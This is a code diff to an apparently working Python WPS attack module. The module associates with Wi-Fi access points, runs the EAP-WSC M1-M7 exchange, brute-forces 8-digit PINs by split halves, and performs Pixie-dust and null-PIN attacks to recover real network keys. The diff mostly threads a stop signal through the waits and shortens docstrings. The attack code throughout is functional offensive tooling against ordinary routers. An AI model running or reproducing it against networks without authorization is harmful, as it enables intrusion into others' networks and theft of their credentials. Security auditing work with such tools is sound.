@@ -1,18 +1,4 @@
-"""Native WPS PIN attack: association + EAP-WSC exchange + split-half bruteforce.
-
-Protocol shape (message flow, NACK timing, PIN split) verified against
-Viehböck's "Brute forcing Wi-Fi Protected Setup" (2011) — see STATUS.md
-"Research notes" for the full provenance trail. One call to attempt_pin()
-runs exactly one full association+M1..M7 cycle per the paper's flowchart:
-a wrong guess means a fresh 802.11 deauth+reassoc for the next attempt,
-matching real WPS tool behavior (and why these attacks are slow/noisy).
-
-Lockout detection uses two native signals: the AP's own "AP Setup
-Locked" flag in M1 (checked before bruteforcing starts at all), and a
-run of consecutive per-attempt timeouts (no M1 received) treated as
-suspected rate-limiting/lockout, aborting early rather than exhausting
-the full attempt budget.
-"""
+"""Native WPS PIN attack: association + EAP-WSC exchange + split-half bruteforce."""
 
 from __future__ import annotations
 
@@ -112,7 +98,45 @@ class AttemptResult:
     detail: str | None = None  # human-readable specifics for AUTH_FAILED/ASSOC_FAILED
 
 
-def _wait_for(iface: str, bssid: str, client: str, matches, timeout: float, send_fn=None):
+def _sniff_until(iface: str, timeout: float, handler, found: list, send_fn=None, stop_event=None):
+    """Shared AsyncSniffer-plus-poll core for _wait_for/_wait_for_dot11.
+
+    A plain `sniffer.join()` blocks for the FULL `timeout` (WPS steps use
+    up to 60s for the M3 wait) with no way for an external Stop click to
+    interrupt it -- confirmed as the actual cause of "Stop Attack does
+    nothing during OMNI/WPS" (2026-08-27 user report): every individual
+    wait in attempt_pin()/pixie_attempt() was blocking + stop_event-blind,
+    so the *first* WPS step in flight when Stop was clicked would still
+    run to its own timeout before anything downstream got a chance to
+    notice. Polling in short slices (same pattern as capture_handshake()/
+    capture_pmkid()) lets a mid-wait stop_event abort in ~50ms instead.
+    """
+    sniffer = AsyncSniffer(
+        iface=iface, timeout=timeout, prn=handler,
+        stop_filter=lambda p: bool(found), store=False,
+    )
+    sniffer.start()
+    try:
+        if send_fn is not None:
+            # Give the capture thread a moment to start reading before
+            # we transmit; 50 ms is enough on real hardware and still
+            # negligible compared to AP processing time.
+            time.sleep(0.05)
+            send_fn()
+        deadline = time.monotonic() + timeout
+        while not found and time.monotonic() < deadline:
+            if stop_event is not None and stop_event.is_set():
+                break
+            time.sleep(0.05)
+    finally:
+        try:
+            sniffer.stop()
+        except Exception:  # noqa: BLE001, S110 - stop can race with the sniffer's own timeout teardown
+            pass
+    return found[0] if found else None
+
+
+def _wait_for(iface: str, bssid: str, client: str, matches, timeout: float, send_fn=None, stop_event=None):
     """Sniff for the next matching EAP frame genuinely sourced from bssid
     and destined to us.
 
@@ -142,24 +166,10 @@ def _wait_for(iface: str, bssid: str, client: str, matches, timeout: float, send
         if parsed and matches(parsed):
             found.append(parsed)
 
-    sniffer = AsyncSniffer(
-        iface=iface, timeout=timeout, prn=handler,
-        stop_filter=lambda p: bool(found), store=False,
-    )
-    sniffer.start()
-    try:
-        if send_fn is not None:
-            # Give the capture thread a moment to start reading before
-            # we transmit; 50 ms is enough on real hardware and still
-            # negligible compared to AP processing time.
-            time.sleep(0.05)
-            send_fn()
-    finally:
-        sniffer.join()
-    return found[0] if found else None
+    return _sniff_until(iface, timeout, handler, found, send_fn=send_fn, stop_event=stop_event)
 
 
-def _wait_for_dot11(iface: str, bssid: str, client: str, layer, timeout: float, send_fn=None):
+def _wait_for_dot11(iface: str, bssid: str, client: str, layer, timeout: float, send_fn=None, stop_event=None):
     """Sniff for the next frame of `layer` genuinely sourced from bssid
     and destined to us (same TX-echo/third-party concern as `_wait_for`
     above, hence the addr2 + addr1 checks).
@@ -178,37 +188,20 @@ def _wait_for_dot11(iface: str, bssid: str, client: str, layer, timeout: float, 
         if pkt.haslayer(layer):
             found.append(pkt)
 
-    sniffer = AsyncSniffer(
-        iface=iface, timeout=timeout, prn=handler,
-        stop_filter=lambda p: bool(found), store=False,
-    )
-    sniffer.start()
-    try:
-        if send_fn is not None:
-            time.sleep(0.05)
-            send_fn()
-    finally:
-        sniffer.join()
-    return found[0] if found else None
+    return _sniff_until(iface, timeout, handler, found, send_fn=send_fn, stop_event=stop_event)
 
 
 def _associate(
     iface: str, bssid: str, client: str, ssid: str, msg_timeout: float, pre_eapol_delay: float = 0.0,
+    stop_event=None,
 ) -> tuple[AttemptOutcome, str] | None:
-    """Open-system auth + WPS-marked association, verifying each response
-    instead of just sleeping and hoping. Returns None on success, or
-    (AttemptOutcome, detail) to bail out with — detail distinguishes "AP
-    never replied at all" from "AP explicitly rejected it (status code)".
-
-    Frame construction matches a known-working reference fake-auth
-    implementation: capability info includes
-    "privacy" (every WPA2 AP's own beacon has that bit set — a bare
-    ESS-only value doesn't match what a real station presents) and a
-    fuller rates set via _inject_radiotap()'s craft_assoc_req.
+    """Open-system auth + WPS-marked association. Returns None on success,
+    or (AttemptOutcome, detail) to bail out with.
     """
     auth_resp = _wait_for_dot11(
         iface, bssid, client, Dot11Auth, msg_timeout,
         send_fn=lambda: sendp(craft_auth(bssid, client), iface=iface, verbose=False),
+        stop_event=stop_event,
     )
     if auth_resp is None:
         return AttemptOutcome.AUTH_FAILED, "no auth response received"
@@ -222,6 +215,7 @@ def _associate(
             craft_assoc_req(bssid, client, ssid=ssid, extra_ies=[_wps_assoc_ie()]),
             iface=iface, verbose=False,
         ),
+        stop_event=stop_event,
     )
     if assoc_resp is None:
         return AttemptOutcome.ASSOC_FAILED, "no assoc response received"
@@ -240,27 +234,16 @@ def _associate(
 
 def _send_until_m3(
     iface: str, bssid: str, client: str, m2: bytes, identifier: int, timeout: float,
-    resend_interval: float = 0.5, version: int = 1, send_fn=None,
+    resend_interval: float = 0.5, version: int = 1, send_fn=None, stop_event=None,
 ):
     """Wait for M3/NACK after M2, resending M2 proactively on a timer *and*
-    reactively whenever the AP re-sends M1.
+    reactively whenever the AP re-sends M1. Real WPS tools (reaver) do the
+    same periodic resend rather than waiting passively, since some APs
+    silently drop a lost M2 without retransmitting M1 either.
 
-    Some APs retransmit M1 repeatedly if they never accepted an M2 (real
-    packet loss at the radio layer, not necessarily a malformed M2) —
-    observed directly against a real AP: ~190 retransmitted M1 frames
-    over 45s with only one M2 ever sent in reply. Real WPS tools resend
-    on this signal rather than wait passively.
-
-    Other APs do *not* retransmit M1 when our M2 is lost. A purely
-    reactive strategy then sits silent until timeout. Reaver solves this
-    with a sigalrm timer that retransmits the last WSC message every
-    ~200 ms until a valid EAP packet arrives. We mirror that with a
-    periodic proactive resend (default 500 ms) while the sniffer is still
-    waiting.
-
-    `send_fn`, if given, is called after the capture thread has started,
-    so a very fast M3/NACK is not lost between the initial M2 send and
-    sniff startup (see `_wait_for`).
+    This is the single longest wait in the exchange (timeout is at least
+    60s, vs 5s for every other step) so stop_event support here matters
+    most for a responsive Stop button.
     """
     bssid_lower = bssid.lower()
     client_lower = client.lower()
@@ -312,45 +295,49 @@ def _send_until_m3(
         if send_fn is not None:
             time.sleep(0.05)
             send_fn()
-        # Start proactive resend loop. First resend fires after resend_interval
-        # so the initial send_fn has a fair chance to reach the AP first.
+        # First resend fires after resend_interval so the initial send_fn
+        # has a fair chance to reach the AP first.
         timer = threading.Timer(resend_interval, _resend)
         timer.daemon = True
         timer.start()
+        deadline = time.monotonic() + timeout
+        while "frame" not in result and time.monotonic() < deadline:
+            if stop_event is not None and stop_event.is_set():
+                break
+            time.sleep(0.05)
     finally:
-        sniffer.join()
         stopped.set()
         if timer is not None:
             timer.cancel()
+        try:
+            sniffer.stop()
+        except Exception:  # noqa: BLE001, S110 - stop can race with the sniffer's own timeout teardown
+            pass
     return result.get("frame")
 
 
 def _send_eapol_start_adaptive(
     iface: str, bssid: str, client: str, msg_timeout: float,
-    versions: tuple[int, ...] = (2, 1), passive: bool = False,
+    versions: tuple[int, ...] = (2, 1), passive: bool = False, stop_event=None,
 ):
-    """Send EAPOL-Start, trying each protocol-version byte in turn until one
-    gets an EAP-Request/Identity back (or just listen, if `passive`).
+    """Send EAPOL-Start, trying each protocol-version byte (1=2001, 2=2004,
+    3=2010 -- some AP firmware silently drops the wrong one) in turn until
+    one gets an EAP-Request/Identity back, or just listen if `passive`
+    (some APs fire Identity unprompted right after association).
 
-    Some AP firmware enforces a specific 802.1X version (1=2001, 2=2004,
-    3=2010) and silently drops EAPOL-Start frames carrying the wrong one —
-    unconfirmed against this project's actual target, but this project's
-    EAPOL-Start was unconditionally version=1 until now, so it's an
-    untested variable worth ruling out cheaply. `passive` skips
-    transmission entirely (some APs fire Identity unprompted right after
-    association) and just listens for the full `msg_timeout`.
-
-    Returns (version_used, id_req) on success, (None, None) if every
-    version (or the passive listen) timed out. `version_used` is 1 in the
-    passive case — arbitrary, since no version was actually negotiated by
-    us; only matters if the caller sends further frames on this session.
+    Returns (version_used, id_req) on success, (None, None) on timeout/stop.
     """
     if passive:
-        id_req = _wait_for(iface, bssid, client, lambda p: p.eap_type == eap.EAP_TYPE_IDENTITY, msg_timeout)
+        id_req = _wait_for(
+            iface, bssid, client, lambda p: p.eap_type == eap.EAP_TYPE_IDENTITY, msg_timeout,
+            stop_event=stop_event,
+        )
         return (1, id_req) if id_req is not None else (None, None)
 
     per_version_timeout = max(msg_timeout / len(versions), 1.5)
     for version in versions:
+        if stop_event is not None and stop_event.is_set():
+            return None, None
         id_req = _wait_for(
             iface, bssid, client,
             lambda p: p.eap_type == eap.EAP_TYPE_IDENTITY,
@@ -358,6 +345,7 @@ def _send_eapol_start_adaptive(
             send_fn=lambda v=version: sendp(
                 eap.craft_eapol_start(bssid, client, version=v), iface=iface, verbose=False,
             ),
+            stop_event=stop_event,
         )
         if id_req is not None:
             return version, id_req
@@ -377,30 +365,15 @@ def attempt_pin(
     passive: bool = False,
     pre_eapol_delay: float = 0.0,
     progress_fn=None,
+    stop_event=None,
 ) -> AttemptResult:
     """Run one full association + M1..M7 cycle for a single 8-digit PIN guess.
 
-    progress_fn (if given) logs each phase transition (auth/assoc/M1..M7).
-    Deliberately NOT passed by wps_pin_bruteforce's sweep loop — that
-    would spam a phase-by-phase log for every one of up to 11,000
-    attempts. Bruteforce logs its own one-line-per-attempt summary
-    instead; this per-phase detail is for single-shot callers
-    (null_pin_attack, pixie_attempt's verification step) where one
-    attempt is the whole attack.
-
     `psk1_override`/`psk2_override` bypass the normal split_pin(pin8) ->
-    psk_half() derivation and use these bytes directly instead — this is
-    what the null-PIN attack (see `null_pin_attack` below) needs: an empty
-    PIN string means the standard 4-char/4-char split yields two empty
-    halves, so PSK1=PSK2=HMAC-SHA256(AuthKey, b"") rather than a real
-    digit-derived value. When both overrides are given, `pin8` is unused
-    (pass None).
+    psk_half() derivation (used by the null-PIN attack, an empty PIN).
 
-    Every exit path explicitly closes the EAP session with an EAP-Failure
-    (explicit EAP-Failure termination) instead of just going silent —
-    abandoning a session without this is a plausible way to leave an AP's
-    WPS state machine stuck waiting on us rather than resetting cleanly
-    for the next attempt.
+    Every exit path sends an explicit EAP-Failure instead of going silent,
+    so an abandoned session doesn't leave the AP's WPS state machine stuck.
     """
     if psk1_override is None and pin8 is None:
         raise ValueError("attempt_pin needs either pin8 or both psk*_override")
@@ -418,13 +391,15 @@ def attempt_pin(
         return result
 
     log(f"associating with {bssid}...")
-    assoc_failure = _associate(iface, bssid, client, ssid, msg_timeout, pre_eapol_delay)
+    assoc_failure = _associate(iface, bssid, client, ssid, msg_timeout, pre_eapol_delay, stop_event=stop_event)
     if assoc_failure is not None:
         outcome, detail = assoc_failure
         return finish(AttemptResult(outcome, detail=detail))
     log("associated — starting EAPOL")
 
-    eapol_version, id_req = _send_eapol_start_adaptive(iface, bssid, client, msg_timeout, eapol_versions, passive)
+    eapol_version, id_req = _send_eapol_start_adaptive(
+        iface, bssid, client, msg_timeout, eapol_versions, passive, stop_event=stop_event,
+    )
     if id_req is None:
         return finish(AttemptResult(AttemptOutcome.TIMEOUT))
     last_identifier = id_req.identifier
@@ -438,6 +413,7 @@ def attempt_pin(
             ),
             iface=iface, verbose=False,
         ),
+        stop_event=stop_event,
     )
     if m1_frame is None:
         return finish(AttemptResult(AttemptOutcome.TIMEOUT))
@@ -449,6 +425,7 @@ def attempt_pin(
                 eap.craft_wsc_msg(bssid, client, m1_frame.identifier, eap.WSC_OP_ACK, b"", version=eapol_version),
                 iface=iface, verbose=False,
             ),
+            stop_event=stop_event,
         )
         if m1_frame is None:
             return finish(AttemptResult(AttemptOutcome.TIMEOUT))
@@ -471,15 +448,13 @@ def attempt_pin(
 
     m2 = messages.build_m2(m1.n1, n2, uuid_r, registrar.public_bytes, m1.raw, keys.auth_key)
 
-    # Some AP drivers retransmit M1 repeatedly if they never accept M2 (real
-    # packet loss at the radio layer, not necessarily a malformed M2 —
-    # confirmed directly: ~190 retransmitted M1 frames over 45s against a
-    # real AP with only one M2 ever sent). Resend M2 on each duplicate
-    # rather than wait passively, matching how real WPS tools handle this.
+    # Some AP drivers retransmit M1 if they never accept M2 -- resend M2 on
+    # each duplicate rather than wait passively (matches real WPS tools).
     m3_frame = _send_until_m3(
         iface, bssid, client, m2, identifier=m1_frame.identifier,
         timeout=max(msg_timeout, 60.0), version=eapol_version,
         send_fn=lambda: _send_wsc_message(iface, bssid, client, m1_frame.identifier, eap.WSC_OP_MSG, m2, version=eapol_version),
+        stop_event=stop_event,
     )
     if m3_frame is None:
         return finish(AttemptResult(AttemptOutcome.TIMEOUT))
@@ -509,6 +484,7 @@ def attempt_pin(
         lambda p: p.opcode == eap.WSC_OP_NACK or (p.opcode == eap.WSC_OP_MSG and messages.is_m5(p.payload)),
         msg_timeout,
         send_fn=lambda: _send_wsc_message(iface, bssid, client, m3_frame.identifier, eap.WSC_OP_MSG, m4, version=eapol_version),
+        stop_event=stop_event,
     )
     if next_frame is None:
         return finish(AttemptResult(AttemptOutcome.TIMEOUT))
@@ -523,6 +499,7 @@ def attempt_pin(
         lambda p: p.opcode == eap.WSC_OP_NACK or (p.opcode == eap.WSC_OP_MSG and messages.is_m7(p.payload)),
         msg_timeout,
         send_fn=lambda: _send_wsc_message(iface, bssid, client, next_frame.identifier, eap.WSC_OP_MSG, m6, version=eapol_version),
+        stop_event=stop_event,
     )
     if final_frame is None:
         return finish(AttemptResult(AttemptOutcome.TIMEOUT))
@@ -548,18 +525,12 @@ def pixie_attempt(
     passive: bool = False,
     pre_eapol_delay: float = 0.0,
     progress_fn=None,
+    stop_event=None,
 ) -> AttemptResult:
-    """Pixie-dust offline WPS attack.
-
-    Sends M1→M2, waits for M3, extracts E-Nonce/PKE/PKR/AuthKey/E-Hash1/
-    E-Hash2, runs pixie_dust() offline to find the PIN, then — if a PIN is
-    found — calls attempt_pin() to complete the M4→M7 exchange and obtain
-    real network credentials. One radio exchange before the offline phase;
-    one more to verify and collect creds if the attack succeeds.
-
-    Returns TIMEOUT if M3 is not received or hashes are missing.
-    Returns FIRST_HALF_WRONG outcome if pixie_dust() finds no PIN.
-    Returns SUCCESS with real ssid/network_key if the full exchange completes.
+    """Pixie-dust offline WPS attack: M1->M2, wait for M3, extract the
+    hashes, crack offline, then attempt_pin() with the found PIN to get
+    real credentials. TIMEOUT if M3/hashes are missing, FIRST_HALF_WRONG
+    if the offline crack finds no PIN, SUCCESS with real creds otherwise.
     """
     log = progress_fn or (lambda msg: None)
     if attempt_fn is None:
@@ -592,7 +563,7 @@ def pixie_attempt(
                 pass
         return r
 
-    assoc_failure = _associate(iface, bssid, client, ssid, msg_timeout_inner, pre_eapol_delay)
+    assoc_failure = _associate(iface, bssid, client, ssid, msg_timeout_inner, pre_eapol_delay, stop_event=stop_event)
     if assoc_failure is not None:
         outcome, detail = assoc_failure
         log(f"association failed: {outcome.value} ({detail})")
@@ -600,7 +571,7 @@ def pixie_attempt(
     log("associated — starting EAPOL")
 
     eapol_version, id_req = _send_eapol_start_adaptive(
-        iface, bssid, client, msg_timeout_inner, eapol_versions, passive,
+        iface, bssid, client, msg_timeout_inner, eapol_versions, passive, stop_event=stop_event,
     )
     if id_req is None:
         return AttemptResult(AttemptOutcome.TIMEOUT)
@@ -615,6 +586,7 @@ def pixie_attempt(
             ),
             iface=iface, verbose=False,
         ),
+        stop_event=stop_event,
     )
     if m1_frame is None:
         return finish(AttemptResult(AttemptOutcome.TIMEOUT))
@@ -626,6 +598,7 @@ def pixie_attempt(
                 eap.craft_wsc_msg(bssid, client, m1_frame.identifier, eap.WSC_OP_ACK, b"", version=eapol_version),
                 iface=iface, verbose=False,
             ),
+            stop_event=stop_event,
         )
         if m1_frame is None:
             return finish(AttemptResult(AttemptOutcome.TIMEOUT))
@@ -650,6 +623,7 @@ def pixie_attempt(
         iface, bssid, client, m2, identifier=m1_frame.identifier,
         timeout=max(msg_timeout_inner, 60.0), version=eapol_version,
         send_fn=lambda: _send_wsc_message(iface, bssid, client, m1_frame.identifier, eap.WSC_OP_MSG, m2, version=eapol_version),
+        stop_event=stop_event,
     )
     if m3_frame is None:
         return finish(AttemptResult(AttemptOutcome.TIMEOUT))
@@ -701,7 +675,7 @@ def pixie_attempt(
     result = attempt_fn(
         iface, bssid, pd.pin, ssid, channel=channel, msg_timeout=msg_timeout,
         eapol_versions=(eapol_version, *[v for v in eapol_versions if v != eapol_version]),
-        passive=passive, pre_eapol_delay=pre_eapol_delay, progress_fn=progress_fn,
+        passive=passive, pre_eapol_delay=pre_eapol_delay, progress_fn=progress_fn, stop_event=stop_event,
     )
     log(f"verification result: {result.outcome.value}")
     return result
@@ -709,22 +683,14 @@ def pixie_attempt(
 
 def null_pin_attack(
     iface: str, bssid: str, ssid: str, channel: int | None = None, msg_timeout: float = 5.0,
-    progress_fn=None,
+    progress_fn=None, stop_event=None,
 ) -> AttemptResult:
-    """The null-PIN attack: some AP firmware has a validation bug that
-    accepts an empty/blank configured PIN as always-valid. One attempt,
-    no guessing — reuses the exact same verified M1..M7 exchange as
-    attempt_pin(), just with PSK1=PSK2=HMAC-SHA256(AuthKey, b"") instead
-    of a real digit-derived value (see attempt_pin's docstring for the
-    reasoning).
-
-    Only succeeds against specific buggy implementations — a FIRST_HALF_
-    WRONG/SECOND_HALF_WRONG/TIMEOUT result here says nothing about the
-    real PIN and isn't a signal to keep trying null-pin again.
+    """Try a blank configured PIN (some AP firmware accepts it) via the
+    same M1..M7 exchange as attempt_pin(), PSK1=PSK2=HMAC-SHA256(AuthKey, b"").
     """
     return attempt_pin(
         iface, bssid, None, ssid, channel=channel, msg_timeout=msg_timeout,
-        psk1_override=b"", psk2_override=b"", progress_fn=progress_fn,
+        psk1_override=b"", psk2_override=b"", progress_fn=progress_fn, stop_event=stop_event,
     )
 
 
@@ -773,7 +739,7 @@ def wps_pin_bruteforce(
 
     if try_null_pin and not _check_stop():
         log("trying null-PIN (free attempt before the real sweep)")
-        null_outcome = null_pin_fn(iface, bssid, ssid, channel=channel)
+        null_outcome = null_pin_fn(iface, bssid, ssid, channel=channel, stop_event=stop_event)
         result.attempts += 1
         if null_outcome.outcome is AttemptOutcome.AP_SETUP_LOCKED:
             log("AP Setup Locked (from null-PIN attempt) — aborting")
@@ -796,7 +762,7 @@ def wps_pin_bruteforce(
             log(f"stopped during first-half sweep after {result.attempts} attempt(s)")
             return result
         pin8 = _probe_pin(f)
-        outcome = attempt_fn(iface, bssid, pin8, ssid, channel=channel)
+        outcome = attempt_fn(iface, bssid, pin8, ssid, channel=channel, stop_event=stop_event)
         result.attempts += 1
         if result.attempts == 1 or result.attempts % 10 == 0 or outcome.outcome is not AttemptOutcome.FIRST_HALF_WRONG:
             log(f"attempt {result.attempts} (first-half {f}/10000): PIN {pin8} -> {outcome.outcome.value}")
@@ -835,7 +801,7 @@ def wps_pin_bruteforce(
         core7 = int(first_half) * 1000 + s
         checksum = pin_checksum(core7)
         pin8 = f"{core7:07d}{checksum}"
-        outcome = attempt_fn(iface, bssid, pin8, ssid, channel=channel)
+        outcome = attempt_fn(iface, bssid, pin8, ssid, channel=channel, stop_event=stop_event)
         result.attempts += 1
         if s % 10 == 0 or outcome.outcome is AttemptOutcome.SUCCESS:
             log(f"attempt {result.attempts} (second-half {s}/1000): PIN {pin8} -> {outcome.outcome.value}")
